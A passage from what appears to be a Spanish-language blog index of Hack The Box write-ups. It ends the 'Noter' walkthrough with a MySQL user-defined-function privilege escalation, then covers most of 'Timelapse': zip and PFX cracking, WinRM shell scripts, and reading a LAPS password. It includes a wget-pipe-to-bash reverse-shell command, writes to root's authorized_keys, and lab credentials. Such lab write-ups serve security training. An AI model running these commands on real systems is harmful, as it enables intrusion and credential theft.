existentes.\n1 2 3 4 MariaDB [(none)]\u0026gt; SELECT \u0026#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/kmriBBdSTD8rd7ZWhQ/7gedJ+kCyBPyLcfLCukSwh6fXpvo4greAH02kZ4/jsfN87n39lKfLvHEcYmhTfuVyWApNYwMh4amPO7ej5MKo/P23ltpXSXwh8VSSxTA411Xxkd8jqwTX69QD0Y28vtNsDNU0vcnJQWB+OBhJWdui4b8nvIYuwuLi2pEhEdm1KUB2nLEI4KCtc/Kp8yZtxCV8605jJLQ2GtA88zC9TpovVIezXQy1rjwArgQaFbaV54orZOAklBbHJwm7DmozDZEFS/b5xI+8ydLLYHLPcYxgrU/anqtv7MudygBQ4TK8jCt4oQy/P7SbmYOkKaVbvPaZk0i8CquZ1ZNQzHH9/khAzUNfSBKSxVxBuouDUhQ6D0qWI7O9Ze/k072BqDexcJWnB9Vb4/hRACoiiThvYODLqfgkP5wkVjm6zDUvpygObsya9BJwIU/98lZJUvoakLedEZWjrPILZYuprMkJzvwq+Ld3mNwkkgX7OdUWi47m60E= svc@noter\u0026#39; INTO OUTFILE \u0026#39;/root/.ssh/authorized_keys\u0026#39;; wkkgX7OdUWi47m60E= svc@noter\u0026#39; INTO OUTFILE \u0026#39;/root/.ssh/authorized_keys\u0026#39;;wq+Ld3mN ERROR 1086 (HY000): File \u0026#39;/root/.ssh/authorized_keys\u0026#39; already exists MariaDB [(none)]\u0026gt; User-Defined Functions Multiples post (1,2,3, 4, 5) definen las User-Defined Functions como una forma para escalar privilegios, agregando o creando estas funciones a MySQL las cuales utilizan codigo externo. Para ello se deben de cumplir algunos requisitos.\nMySQL en ejecución como root. Acceso como \u0026lsquo;root\u0026rsquo; a MySQL. Variable secure_file_priv debe de estar desactivada, lo que permitiría importar o exportar información. En este caso asumimos que MySQL está corriendo como root, ya que es posible acceder a archivos como /etc/shadow, /root/root.txt, /root/.ssh/authorized_keys (archivo vacio). El segundo requisito se cumple ya que tenemos acceso como root con las credenciales encontradas en el backup. Finalmente podemos obtener el valor de secure_file_priv el cual está vacio lo que significa que tenemos permitido importar o exportar.\n1 2 3 4 5 6 7 8 9 MariaDB [(none)]\u0026gt; SHOW VARIABLES LIKE \u0026#39;secure_file_priv\u0026#39;; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_file_priv | | +------------------+-------+ 1 row in set (0.003 sec) MariaDB [(none)]\u0026gt; Creamos una UDF Function siguiendo los pasos de este post. Descargamos y compilamos la libreria compartida.\n1 2 3 4 5 6 7 svc@noter:~/mysql$ ls raptor_udf2.c svc@noter:~/mysql$ gcc -g -c raptor_udf2.c svc@noter:~/mysql$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc svc@noter:~/mysql$ ls raptor_udf2.c raptor_udf2.o raptor_udf2.so svc@noter:~/mysql$ Utilizamos la base de datos mysql donde vemos el directorio de la variable plugin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 MariaDB [(none)]\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [mysql]\u0026gt; show variables like \u0026#39;%plugin%\u0026#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ 2 rows in set (0.002 sec) MariaDB [mysql]\u0026gt; Se crea una tabla donde se guarda el contenido de la libreria para luego crear el archivo de la UDF en el directorio de la variable anterior. Finalmente se crea la función do_system(). Se verifica que dicha función fue creada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 MariaDB [mysql]\u0026gt; create table foo(line blob); Query OK, 0 rows affected (0.008 sec) MariaDB [mysql]\u0026gt; insert into foo values(load_file(\u0026#39;/home/svc/mysql/raptor_udf2.so\u0026#39;)); Query OK, 1 row affected (0.003 sec) MariaDB [mysql]\u0026gt; select * from foo into dumpfile \u0026#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so\u0026#39;; Query OK, 1 row affected (0.001 sec) MariaDB [mysql]\u0026gt; create function do_system returns integer soname \u0026#39;raptor_udf2.so\u0026#39;; Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]\u0026gt; select * from mysql.func; +-----------+-----+----------------+----------+ | name | ret | dl | type | +-----------+-----+----------------+----------+ | do_system | 2 | raptor_udf2.so | function | +-----------+-----+----------------+----------+ 1 row in set (0.000 sec) MariaDB [mysql]\u0026gt; Finalmente ejecutamos una shell inversa utilizando la funcion junto con shells.\n1 MariaDB [mysql]\u0026gt; select do_system(\u0026#39;wget -qO- 10.10.14.207:8080/10.10.14.207:1335|bash\u0026#39;); Obtuvimos una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/noter ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from 10.10.11.160 [10.10.11.160] 42314 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@noter:/var/lib/mysql# whoami;id root uid=0(root) gid=0(root) groups=0(root) root@noter:/var/lib/mysql# cd /root root@noter:/root# ls root.txt scripts root@noter:/root# cat root.txt 312ec65653c3d61c2fc948e8ab89d969 root@noter:/root# Observamos que MySQL está corriendo como root.\n1 2 3 4 5 6 7 root@noter:/root# ps -ef|grep mysql root 1060 1 0 02:01 ? 00:00:00 /bin/sh /usr/bin/mysqld_safe root 1177 1060 0 02:01 ? 00:00:02 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock root 1178 1060 0 02:01 ? 00:00:00 logger -t mysqld -p daemon error svc 6346 1684 0 02:40 pts/0 00:00:00 mysql -u root -p root 7308 6554 0 02:48 pts/1 00:00:00 grep mysql root@noter:/root# Cronjobs Como usuario root encontramos dos cronjobs, el primero restaura a su estado inicial la base de datos de la aplicación Noter.\n1 2 3 4 5 root@noter:/root# crontab -l # m h dom mon dow command 0 */3 * * * /root/scripts/cleanup.py */4 * * * * /root/scripts/reset_mysql.sh root@noter:/root# El segundo realiza lo mismo con la base de datos mysql, además elimina cualquier plugin/libreria en el directorio de MySQL y PDFs creados por Noter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@noter:/root# cat /root/scripts/reset_mysql.sh #!/bin/bash rm -r /usr/lib/x86_64-linux-gnu/mariadb19/plugin/* 2\u0026gt;/dev/null rm -r /home/svc/app/web/misc/attachments/* 2\u0026gt;/dev/null mysql -u root -pNildogg36 -e \u0026#34;DROP database mysql\u0026#34; mysql -u root -pNildogg36 -e \u0026#34;CREATE database mysql\u0026#34; mysql -u root -pNildogg36 mysql \u0026lt; /root/scripts/mysql_backup.sql mysql -u root -pNildogg36 -e \u0026#39;truncate mysql.func\u0026#39; mysql -u root -pNildogg36 mysql -e \u0026#34;drop function do_system\u0026#34; 2\u0026gt;/dev/null root@noter:/root# ","description":"Noter presenta un sitio web por donde obtuvimos acceso tras crackear y modificar la cookie de flask, con la información que encontramos en el sitio logramos ingresar por FTP donde descubrimos un backup, lo que nos permitió descubrir una vulnerabilidad Command Injection con la cual accedimos a la máquina. Finalmente logramos leer la flag root utilizando MySQL y acceso como root con User-Defined Functions.","id":18,"section":"posts","tags":["xss","flask_unsign","flask","python","ftp","javascript","command injection","mySQL","user-defined functions"],"title":"Hack The Box - Noter","uri":"https://sckull.github.io/posts/noter/"},{"content":"\rEn Timelapse descubrimos un backup de WinRM, este contenia un certificado de autenticación de WinRM, mismo que nos permitió obtener acceso a un primer usuario. El historial de PowerShell nos permitió acceder a la contraseña de un segundo usuario. Finalmente observamos que el usuario pertenecia a un grupo relacionado a LAPS, lo cual nos permitió obtener la contraseña de administrador.\nNombre Timelapse OS Windows Puntos 20 Dificultad Facil IP 10.10.11.152 Maker ctrlzero\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.4, 4.5, 5.5, 4.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 10, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: dns (53), kerberos (88), rpc (135), ldap (389), winrm (5986).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # Nmap 7.92 scan initiated Tue Mar 29 19:32:52 2022 as: nmap -p53,88,135,139,389,445,593,636,3268,3269,5986,9389,49667,49674,49696,53230 -sV -sC -oN nmap_scan -Pn 10.10.11.152 Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.071s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-30 07:32:57Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 |_ssl-date: 2022-03-30T07:34:26+00:00; +7h59m58s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49696/tcp open msrpc Microsoft Windows RPC 53230/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-03-30T07:33:47 |_ start_date: N/A |_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 29 19:34:30 2022 -- 1 IP address (1 host up) scanned in 97.61 seconds RPC/SMB/LDAP Sesiones nulas no nos permitieron obtener informacion por smb, ldap y rpc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/timelapse ❯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.11.152 rpcclient $\u0026gt; enumdomusers result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; enumdomgroups result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; exit π ~/htb/timelapse ❯ π ~/htb/timelapse ❯ crackmapexec smb 10.10.11.152 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) SMB 10.10.11.152 445 DC01 [-] timelapse.htb\\: STATUS_ACCESS_DENIED SMB 10.10.11.152 445 DC01 [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) π ~/htb/timelapse ❯ crackmapexec ldap 10.10.11.152 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) SMB 10.10.11.152 445 DC01 [-] Error in searchRequest -\u0026gt; operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563 [.. snip ..] π ~/htb/timelapse ❯ SMB - Guest Kerbrute Utilizamos kerbrute para enumerar los usuarios con un pequeño wordlist. Encontramos los usuarios: administrator y guest.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/timelapse ❯ ./kerbrute userenum --domain timelapse.htb --dc timelapse.htb usernames.txt -t 100 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 04/22/22 - Ronnie Flathers @ropnop 2022/04/22 20:12:12 \u0026gt; Using KDC(s): 2022/04/22 20:12:12 \u0026gt; timelapse.htb:88 2022/04/22 20:12:17 \u0026gt; [+] VALID USERNAME: administrator@timelapse.htb 2022/04/22 20:16:19 \u0026gt; [+] VALID USERNAME: guest@timelapse.htb 2022/04/22 20:22:11 \u0026gt; Done! Tested 86771 usernames (2 valid) in 599.200 seconds π ~/htb/timelapse ❯ SMB Utilizando guest como usuario con crackmapexec, identificamos el recurso compartido Shares donde observamos que el usuario tiene permisos de lectura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/timelapse ❯ crackmapexec smb timelapse.htb -u guest -p \u0026#39;\u0026#39; --shares SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) SMB timelapse.htb 445 DC01 [+] timelapse.htb\\guest: SMB timelapse.htb 445 DC01 [+] Enumerated shares SMB timelapse.htb 445 DC01 Share Permissions Remark SMB timelapse.htb 445 DC01 ----- ----------- ------ SMB timelapse.htb 445 DC01 ADMIN$ Remote Admin SMB timelapse.htb 445 DC01 C$ Default share SMB timelapse.htb 445 DC01 IPC$ READ Remote IPC SMB timelapse.htb 445 DC01 NETLOGON Logon server share SMB timelapse.htb 445 DC01 Shares READ SMB timelapse.htb 445 DC01 SYSVOL Logon server share π ~/htb/timelapse ❯ En el recurso Shares encontramos dos carpetas: \\Dev vemos un archivo zip, \\HelpDesk muestra multiples documentos y un archivo de instalación de LAPS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/timelapse ❯ smbclient //timelapse.htb/Shares -u guest Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 6367231 blocks of size 4096. 1625003 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; ls . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 6367231 blocks of size 4096. 1625003 blocks available smb: \\Dev\\\u0026gt; cd ..\\HelpDesk smb: \\HelpDesk\\\u0026gt; ls . D 0 Mon Oct 25 11:48:42 2021 .. D 0 Mon Oct 25 11:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 10:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 10:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 10:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 10:57:44 2021 6367231 blocks of size 4096. 1625003 blocks available smb: \\HelpDesk\\\u0026gt; User - Legacyy Backup El archivo zip está protegido por contraseña, utilizamos zip2john para obtener el hash y con john la contraseña para decomprimir los archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/timelapse/shares ❯ zip2john winrm_backup.zip \u0026gt; hash_zip ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8 π ~/htb/timelaps/shares ❯ john --wordlist=$ROCK hash_zip Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2022-03-29 21:41) 2.380g/s 8270Kp/s 8270Kc/s 8270KC/s surkerior..superkebab Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. π ~/htb/timelapse/shares ❯ Encontramos un certificado protegido en formato PKCS#12, utilizamos pfx2john.py para obtener el hash y con john la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/timelapse/shares ❯ /usr/share/john/pfx2john.py legacyy_dev_auth.pfx \u0026gt; hash_pfx π ~/htb/timelapse/shares ❯ john --wordlist=$ROCK hash_pfx Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:00:46 DONE (2022-03-29 21:44) 0.02158g/s 69754p/s 69754c/s 69754C/s thuglife06..thsco04 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. π ~/htb/timelapse/shares ❯ Shell - WinRM SSL El nombre del archivo zip nos indica un backup de WinRM por lo que el certificado podria ser utilizado para autenticarnos por winrm. Utilizamos openssl para generar un certificado y una clave.\n1 2 3 4 5 6 7 8 # Extract the private key openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key # Extract the certificate openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt # Decrypt the private key openssl rsa -in legacy.key -out legacy-decrypted.key Utilizando la libreria WinRM con el certificado y clave como lo indica la documentacion SSL, creamos un pequeño script para autenticarnos y ejecutar comandos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 require \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;https://timelapse.htb:5986/wsman\u0026#39;, transport: :ssl, :client_cert =\u0026gt; \u0026#39;legacy.crt\u0026#39;, :client_key =\u0026gt; \u0026#39;legacy-decrypted.key\u0026#39;, :key_pass =\u0026gt; \u0026#39;thuglegacy\u0026#39;, :no_ssl_peer_verification =\u0026gt; true, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end Tras ejecutar el script logramos obtener una shell como legacyy y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/timelapse/shares/cert ❯ ruby shell.rb PS \u0026gt; whoami timelapse\\legacyy PS \u0026gt; pwd Path ---- C:\\Users\\legacyy\\Documents PS \u0026gt; cd ..\\Desktop PS \u0026gt; dir Directory: C:\\Users\\legacyy\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/23/2022 12:12 AM 34 user.txt PS \u0026gt; type user.txt 86914b213ba97b81f82c930a156f3d75 PS \u0026gt; User - svc_deploy Tras ejecutar WinPEAS encontramos que existe un archivo de historial de PowerShell.\n1 2 3 4 5 6 7 8 9 ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings PowerShell v2 Version: 2.0 PowerShell v5 Version: 5.1.17763.1 PowerShell Core Version: Transcription Settings: Module Logging Settings: Scriptblock Logging Settings: PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt PS history size: 434B Encontramos multiples comandos, se muestra Invoke-Command utilizando las credenciales del usuario svc_deploy haciendo una conexión a WinRM por localhost al puerto 5986.\n1 2 3 4 5 6 7 8 9 10 11 12 PS \u0026gt; type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential (\u0026#39;svc_deploy\u0026#39;, $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit PS \u0026gt; Utilizamos el mismo comando ejecutando whoami.\n1 2 3 4 $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck; $p = ConvertTo-SecureString \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential (\u0026#39;svc_deploy\u0026#39;, $p); invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock { whoami } Tras ejecutarlo vemos que tenemos acceso como svc_deploy con estas credenciales.\n1 2 3 PS \u0026gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck; $p = ConvertTo-SecureString \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential (\u0026#39;svc_deploy\u0026#39;, $p); invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock { whoami } timelapse\\svc_deploy PS \u0026gt; Shell Modificamos el script en Ruby con las credenciales encontradas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/timelapse/shares/cert ❯ cat svc_shell.rb require \u0026#39;winrm\u0026#39; conn = WinRM::Connection.new( endpoint: \u0026#39;https://timelapse.htb:5986/wsman\u0026#39;, user: \u0026#39;svc_deploy\u0026#39;, password: \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39;, transport: :ssl, #:client_cert =\u0026gt; \u0026#39;legacy.crt\u0026#39;, #:client_key =\u0026gt; \u0026#39;legacy-decrypted.key\u0026#39;, #:key_pass =\u0026gt; \u0026#39;thuglegacy\u0026#39;, :no_ssl_peer_verification =\u0026gt; true, ) command=\u0026#34;\u0026#34; conn.shell(:powershell) do |shell| until command == \u0026#34;exit\\n\u0026#34; do print \u0026#34;PS \u0026gt; \u0026#34; command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \u0026#34;Exiting with code #{output.exitcode}\u0026#34; end Logramos obtener una shell con el usuario svc_deploy.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/timelapse/shares/cert ❯ ruby svc_shell.rb PS \u0026gt; whoami timelapse\\svc_deploy PS \u0026gt; pwd Path ---- C:\\Users\\svc_deploy\\Documents PS \u0026gt; Privesc Enumeramos la información del usuario svc_deploy vemos que pertenece al grupo LAPS_Readers el cual podría estar relacionado al archivo de instalación de SMB.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 PS C:\\\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ==================== ============================================ timelapse\\svc_deploy S-1-5-21-671920749-559770252-3318990721-3103 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group TIMELAPSE\\LAPS_Readers Group S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled whoami : ERROR: Unable to get user claims information. At line:1 char:1 + whoami /all + ~~~~~~~~~~~ + CategoryInfo : NotSpecified: (ERROR: Unable t...ms information.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError PS C:\\\u0026gt; LAPS Tras investigar un poco, encontramos un post relacionado a LAPS donde se muestra un escenario en el que un usuario sin permisos de administracion pero con permisos de lectura en LAPS puede leer la contraseña de un usuario administrador local. Tras ejecutar el comando mostrado vemos la contraseña de la computadora DC01.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 PS \u0026gt; Get-ADComputer dc01 -Properties ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime, canonicalname CanonicalName : timelapse.htb/Domain Controllers/DC01 DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb DNSHostName : dc01.timelapse.htb Enabled : True ms-mcs-AdmPwd : 6i4pJlu)-6B1n(132tD+3t+5 \u0026lt;------ ms-mcs-AdmPwdExpirationTime : 132956035317974980 Name : DC01 ObjectClass : computer ObjectGUID : 6e10b102-6936-41aa-bb98-bed624c9b98f SamAccountName : DC01$ SID : S-1-5-21-671920749-559770252-3318990721-1000 UserPrincipalName : PS \u0026gt; De igual forma utilizando crackmapexec con el modulo laps es posible obtener la contraseña.\n1 2 3 4 5 6 π ~/htb/timelapse ❯ crackmapexec ldap timelapse.htb -u svc_deploy -p \u0026#39;E3R$Q62^12p7PLlC%KWaxuaV\u0026#39; –kdcHost timelapse.htb -M laps SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) LDAP timelapse.htb 389 DC01 [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV LAPS timelapse.htb 389 DC01 [*] Getting LAPS Passwords LAPS timelapse.htb 389 DC01 Computer: DC01$ Password: 6i4pJlu)-6B1n(132tD+3t+5 π ~/htb/timelapse ❯ Shell Observamos que las credenciales nos permiten acceder a todos los recursos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/timelapse ❯ crackmapexec smb timelapse.htb -u administrator -p \u0026#39;6i4pJlu)-6B1n(132tD+3t+5\u0026#39; --shares SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) SMB timelapse.htb 445 DC01 [+] timelapse.htb\\administrator:6i4pJlu)-6B1n(132tD+3t+5 (Pwn3d!) SMB timelapse.htb 445 DC01 [+] Enumerated shares SMB timelapse.htb 445 DC01 Share Permissions Remark SMB timelapse.htb 445 DC01 ----- ----------- ------ SMB timelapse.htb 445 DC01 ADMIN$ READ,WRITE Remote Admin SMB timelapse.htb 445 DC01 C$ READ,WRITE Default share SMB timelapse.htb 445 DC01 IPC$ READ Remote IPC SMB timelapse.htb 445 DC01 NETLOGON READ,WRITE Logon server share SMB timelapse.htb 445 DC01 Shares READ,WRITE SMB timelapse.htb 445 DC01 SYSVOL READ Logon server share π ~/htb/timelapse ❯ Utilizamos nuevamente un script en ruby con las credenciales del usuario administrator, logrando obtener una shell y la flag root.txt.\n1 2 3 4 5 6 